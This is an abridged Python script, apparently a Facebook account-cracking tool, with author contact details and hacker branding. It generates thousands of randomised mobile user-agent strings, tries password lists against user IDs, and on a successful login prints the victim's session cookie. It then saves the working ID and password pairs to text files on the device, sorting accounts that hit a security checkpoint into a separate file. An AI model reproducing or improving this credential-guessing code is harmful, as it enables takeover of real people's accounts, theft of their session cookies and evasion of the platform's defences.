# NAME : APON CHOWDHURY
# GITHUB : https://github.com/apon200490
# WHATSAPP GROUP : YEASIN PAID COMMAND
# FB ID :  @crazehacker2000
...
for tg in range(1000):
		...
		c='Infinix X668C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
		d=random.randrange(40,115)
		e='0'
		f=random.randrange(3000,6000)
		g=random.randrange(20,100)
...
for ua in range(5000):
    ...
    l='.0'
    CRACK=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(CRACK)
...
for ua in range(5000):
	...
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	CRACK=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(CRACK)
os.system("xdg-open https://www.facebook.com/crazehacker2000")
# LOGO
logo = ("""
...
def Main():
        ...
        if CRACK in ["1","01"]:
            sexy()
        if CRACK in ["2","02"]:
        	os.system('xdg-open https://wa.me/+8801643537105')
        if CRACK in [" 0", "00"]:
            exit()
        else:
            exit()     
def sexy():
    ...
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(' [😈] OK APON-CRACK-OK.txt')
    print(' [😈] CP APON-CRACK-OK.txt')
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
def alh4aj(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;32m[BHH-CRACK-KING]\033[1;36m😈[%s/%s]🥴\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    # =[ UA = PRO ]= #
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;33m[\033[1;32mAPON-CRACK-OK 😈\033[1;33m]\033[1;92m {uid}\033[1;95m|\033[1;92m {ps} ")
                print(f"\033[1;92m[😈] COOKIE :\033[1;95m {coki}")
                open('/sdcard/APON-CRACK-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;33m[\033[1;32mAPON-CRACK-CP\033[1;33m]\033[1;91m {uid}|{ps}")
                open('/sdcard/APON-CRACK-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
